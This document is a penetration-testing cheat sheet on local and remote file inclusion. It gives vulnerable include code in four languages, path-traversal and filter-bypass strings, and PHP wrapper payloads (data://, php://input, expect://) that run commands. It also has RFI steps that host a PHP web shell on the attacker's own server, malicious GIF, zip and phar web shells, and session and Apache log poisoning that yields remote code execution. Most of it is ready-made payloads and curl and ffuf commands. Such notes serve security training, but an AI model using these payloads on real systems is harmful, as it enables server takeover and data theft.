# File Inclusion

## Read vs Execute

| **PHP**                      |     |     |     |
| ---------------------------- | :-: | :-: | :-: |
| `include()`/`include_once()` |  ✅  |  ✅  |  ✅  |
| `require()`/`require_once()` |  ✅  |  ✅  |  ❌  |
| `file_get_contents()`        |  ✅  |  ❌  |  ✅  |
| `fopen()`/`file()`           |  ✅  |  ❌  |  ❌  |
| **NodeJS**                   |     |     |     |
| `fs.readFile()`              |  ✅  |  ❌  |  ❌  |
| `fs.sendFile()`              |  ✅  |  ❌  |  ❌  |
| `res.render()`               |  ✅  |  ✅  |  ❌  |
| **Java**                     |     |     |     |
| `include`                    |  ✅  |  ❌  |  ❌  |
| `import`                     |  ✅  |  ✅  |  ✅  |
| **.NET**                     |     |     |     |
| `@Html.Partial()`            |  ✅  |  ❌  |  ❌  |
| `@Html.RemotePartial()`      |  ✅  |  ❌  |  ✅  |
| `Response.WriteFile()`       |  ✅  |  ❌  |  ❌  |
| `include`                    |  ✅  |  ✅  |  ✅  |

## Local File Inclusion (LFI) <a href="#local-file-inclusion-lfi" id="local-file-inclusion-lfi"></a>

* Common place we usually find LFI within is templating engines.
* A templating engine displays a page that shows the common static parts, such as the `header`, `navigation bar`, and `footer`, and then dynamically loads other content that changes between pages
* #### Impact
  * Leaking source code may allow attackers to test the code for other vulnerabilities, which may reveal previously unknown vulnerabilities.
  * Leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly.
  * Allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.
* #### Examples of Vulnerable Code <a href="#examples-of-vulnerable-code" id="examples-of-vulnerable-code"></a>

<details>

<summary><strong>PHP</strong></summary>

{% code lineNumbers="true" %}
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
## include_once(), require(), require_once(), file_get_contents()
```
{% endcode %}

</details>

<details>

<summary><strong>NodeJS</strong></summary>

{% code lineNumbers="true" %}
```js
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
// render()
```
{% endcode %}

</details>

<details>

<summary><strong>Java</strong></summary>

{% code lineNumbers="true" %}
```java
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
<c:import url= "<%= request.getParameter('language') %>"/>
```
{% endcode %}

</details>

<details>

<summary><strong>.NET</strong></summary>

{% code lineNumbers="true" %}
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
@Html.Partial(HttpContext.Request.Query['language'])
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```
{% endcode %}

</details>

#### Basic LFI <a href="#basic-lfi" id="basic-lfi"></a>

* Able to change the **absolute** file path being pulled to read the content of a different local file.
* Source Code: `include($_GET['language']);`
* This trick would work if the whole input was used within the `include()` function without any additions
* **Common readable files**
  * Linux: `/etc/passwd`
  * Windows: `C:\Windows\boot.ini`&#x20;
* **Windows path syntax notes**
  * Backslash and forward slash both work on Windows/PHP: `..\..\windows\win.ini` and `../../windows/win.ini` are equivalent.
  * UNC paths can also be referenced if the include function resolves them: `\\attacker-ip\share\file.txt`
  * Drive letters can be used directly: `C:\Windows\win.ini` or `C:/Windows/win.ini`

#### Path Traversal <a href="#path-traversal" id="path-traversal"></a>

* Bypass restrictions by traversing directories using **relative paths**
* Source Code: `include("./languages/" . $_GET['language']);`
* Add `../` before our file name, which refers to the parent directory.
* Trick would work even if the entire parameter was used in the `include()` function or prefixed with some value.
* e.g. `../../../../etc/passwd`&#x20;

#### Filename Prefix <a href="#filename-prefix" id="filename-prefix"></a>

* Some cases wher our input may be appended after a different string
* Source Code: `include("lang_" . $_GET['language']);`
* Instead of directly using path traversal, we can prefix a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories
* eg. `/../../etc/passwd`&#x20;

#### Appended Extensions <a href="#appended-extensions" id="appended-extensions"></a>

* We would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files
* `include($_GET['language'] . ".php");`
* Append `#` to consider the extension as fragment.

#### Second-Order Attacks <a href="#second-order-attacks" id="second-order-attacks"></a>

* Occurs when web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.
* For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

### Basic Bypasses <a href="#basic-bypasses" id="basic-bypasses"></a>

* #### Non-Recursive Path Traversal Filters <a href="#non-recursive-path-traversal-filters" id="non-recursive-path-traversal-filters"></a>
  * Basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.
  * `$language = str_replace('../', '', $_GET['language']);`  <sup><sub>(source-code)<sub></sup>
  * **Bypasses**: `..././`, `....////`, `....//` , `....\/` , `.?/.*/.?/etc/passwd`
* #### Encoding <a href="#encoding" id="encoding"></a>
  * Web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals.
  * Filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters.
  * Byapss: `%2e%2e%2f`&#x20;
* #### Approved Paths <a href="#approved-paths" id="approved-paths"></a>
  * Web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
  * `if(preg_match('/^./languages/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }` <sup><sub>(source-code)<sub></sup>
  * To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality.
  * Bypass: `allowed-path/../../../etc/passwd`&#x20;
* #### Appended Extension <a href="#appended-extension" id="appended-extension"></a>
  * Web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension.
  * Obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4
  * **Path Truncation**
    * In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems.
    * PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`).
    * PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`).&#x20;
    * Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).
    * **Bypass:** `?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]`&#x20;
    * `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././././././`&#x20;
  * **Null Bytes**
    * PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string.
    * **Bypass**: `/etc/passwd%00`

### PHP Wrappers <a href="#php-filters" id="php-filters"></a>

* Utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.
* PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.
* #### Input Filters Wrapper <a href="#input-filters" id="input-filters"></a>
  * [PHP Filters](https://www.php.net/manual/en/filters.php) allow us to transform stream data by applying specific filters during stream operations.
  * To access the PHP filter wrapper with `php://filter/` to apply filters to a resource.
  * The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`.&#x20;
  * Read parameter has four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
  * Fuzzing for PHP Files :  `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:/FUZZ.php`&#x20;
  * **Payload**: `php://filter/read=convert.base64-encode/resource=config`&#x20;
  * eg: `http://<SERVER_IP>:/index.php?language=php://filter/read=convert.base64-encode/resource=config`&#x20;
* #### Data Wrapper <a href="#data" id="data"></a>
  * Used to include external data, including PHP code.
  * Data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
  * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
  * eg: `php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`&#x20;
  * **Payloads**
    * `echo '<?php system($_GET["cmd"]); ?>' | base64`&#x20;
    * `data://text/plain;base64,=<base64-value>&cmd=id`&#x20;
    * eg: `curl -s 'http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'`&#x20;
* #### Input Wrapper <a href="#input" id="input"></a>
  * The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.
  * The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.
  * So, the vulnerable parameter must accept POST requests for this attack to work.
  * &#x20;The `input` wrapper also depends on the `allow_url_include` .
  * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
  * **Payload**: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:/index.php?language=php://input&cmd=id" | grep uid`&#x20;
  * To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
  * #### Expect Wrapper <a href="#expect" id="expect"></a>
    * The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams.&#x20;
    * Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.
    * However, `expect` is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality.
    * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
    * **Syntax**: `extension=expect`&#x20;
    * **Payload**: `expect://id`
    * eg:  `curl -s "http://<SERVER_IP>:/index.php?language=expect://id"`

## Remote File Inclusion (RFI) <a href="#remote-file-inclusion-rfi" id="remote-file-inclusion-rfi"></a>

* Include remote files, if the vulnerable function allows the inclusion of remote URLs.
* This allows two main benefits:
  1. Enumerating local-only ports and web applications (i.e. SSRF)
  2. Gaining remote code execution by including a malicious script that we host

### Verify RFI <a href="#verify-rfi" id="verify-rfi"></a>

* Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled
* PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
* More reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content.
* eg: `http://127.0.0.1:80/index.php`  and other remote URL's

### Remote Code Execution <a href="#remote-code-execution-with-rfi" id="remote-code-execution-with-rfi"></a>

* Create a malicious script in the language of the web application.
* eg: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`&#x20;
* Host this script and include it through the RFI vulnerability
  * **HTTP**
    * `sudo python3 -m http.server <PORT>`&#x20;
    * **Payload**: `http://<SERVER_IP>:/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=id`
  * **FTP**
    * `sudo python -m pyftpdlib -p 21`&#x20;
    * **Payload**: `http://<SERVER_IP>:/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`&#x20;
  * **SMB** <sup><sub>(windows server)<sub></sup>
    * `impacket-smbserver -smb2support share $(pwd)` <sup><sub>(anonymous authentication)<sub></sup>
    * **Payload:** `http://<SERVER_IP>:/index.php?language=\<OUR_IP>\share\shell.php&cmd=whoami`

## LFI and File Uploads <a href="#lfi-and-file-uploads" id="lfi-and-file-uploads"></a>

* If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.
* For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
* #### Crafting Malicious Image
  * Create a malicious image containing a PHP web shell code that still looks and works as an image.&#x20;
  * Use an allowed image extension in our file name (e.g. `shell.gif`), and include the image magic bytes at the beginning of the file content (e.g. `GIF8`)
  * **Payload**: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`&#x20;
  * This file on its own is completely harmless and would not affect normal web applications in the slightest.
  * If we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
* #### Zip Upload <a href="#zip-upload" id="zip-upload"></a>
  * We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
  * Create a PHP web shell script and zipping it into a zip archive (named `shell.jpg`)
  * **Payload**: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`&#x20;
  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`zip://./profile_images/shell.jpg%23shell.php&cmd=id`**&#x20;
* #### Phar Upload <a href="#phar-upload" id="phar-upload"></a>
  * We can use the `phar://` wrapper to achieve a similar result.
  * <pre class="language-php" data-line-numbers><code class="lang-php">## Save as shell.php
    &#x3C;?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '&#x3C;?php system($_GET["cmd"]); ?>');
    $phar->setStub('&#x3C;?php __HALT_COMPILER(); ?>');

    $phar->stopBuffering();
    ## This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with.
    </code></pre>
  * We can compile it into a `phar` file and rename it to `shell.jpg`&#x20;
  * **Payload**: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`**&#x20;

## Log Poisoning <a href="#log-poisoning" id="log-poisoning"></a>

* Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.&#x20;
* For this attack to work, the PHP web application should have read privileges over the logged files

### PHP Session Poisoning <a href="#php-session-poisoning" id="php-session-poisoning"></a>

* Applications utilize `PHPSESSID` cookies, which hold specific user-related data on the back-end, so the web application can keep track of user details.
* Details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows.
* Name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix.
* **Verify files exist**: `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**&#x20;
* Analyze the file contents to obtain the parameters we can control for poisoning. <sup><sub>(may not be same name, we will need to corelate)<sub></sup>
* Poison that parameter by adding a canary value.
  * `http://<SERVER_IP>:/index.php?language=session_poisoning`&#x20;
  * `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**  <sup><sub>(verify if the poisoned value is reflected or not)<sub></sup>
* **Poison Payload**: `http://<SERVER_IP>:/index.php?language=`**`<?php system($_GET["cmd"]);?>`**&#x20;
* **Render Payload:** `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>&cmd=id`**&#x20;
* **Note:** To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_<cookie-value>` after our last inclusion.

### Server Log Poisoning <a href="#server-log-poisoning" id="server-log-poisoning"></a>

* `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log` .
* File contains various information about all requests made to the server, including each request's `User-Agent` header.
* Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs.
* `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups).
* `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.
* Other Log file locations `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), `/var/log/sshd.log` , `/var/log/mail` , `/var/log/vsftpd.log`
* However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.
* **Read Log File**: `http://<SERVER_IP>:/index.php?language=`**`/var/log/apache2/access.log`**
* Analayze the parameter that is user-controllable.
* We will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent`&#x20;
* **Payload**: `User-Agent:`` `**`<?php system($_GET['cmd']); ?>`**&#x20;
* ```shellscript
  echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
  curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
  ```
* **Render Payload**: `http://<SERVER_IP>:/index.php?language=`**`/var/log/apache2/access.log&cmd=id`**
* **Note**: If the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

## Automated Scanning <a href="#automated-scanning" id="automated-scanning"></a>

### Fuzzing Parameters <a href="#fuzzing-parameters" id="fuzzing-parameters"></a>

* HTML forms users can use on web front-end tend to be properly tested and well secured against different web attacks.&#x20;
* However, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
* [hacktricks-file-inclusion#top-25-parameters](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
* eg: `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?FUZZ=value'`&#x20;

### Fuzzing LFI Payloads <a href="#lfi-wordlists" id="lfi-wordlists"></a>

* [SecLists-Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Fuzzing Server Files <a href="#fuzzing-server-files" id="fuzzing-server-files"></a>

* #### Server Webroot
  * If we wanted to locate a file we uploaded, but cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.
  * We can fuzz for the `index.php` file through common webroot paths, which we can find in this [SecLists-default-web-root-directory-linux.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [SecLists-default-web-root-directory-windows.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.
  * eg: `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ/index.php' -fs 2287`&#x20;
* #### Server Logs/Configurations
  * We need to identify the correct logs directory to be able to perform the log poisoning attacks we discussed.&#x20;
  * We also need to read the server configurations to be able to identify the server webroot path and other important information.
  * We may use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths. If we wanted a more precise scan, we can use [DragonJAR-LFI-WordList-Linux](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux) or [DragonJAR-LFI-WordList-Windows](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows)
  * eg: `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ' -fs 2287`&#x20;

### LFI Tools <a href="#lfi-tools" id="lfi-tools"></a>

* [LFISuite](https://github.com/D35m0nd142/LFISuite)
* [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
* [liffy](https://github.com/mzfr/liffy)

## References

* [hacktricks.wiki-lfi2rce-via-phpinfo()](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)

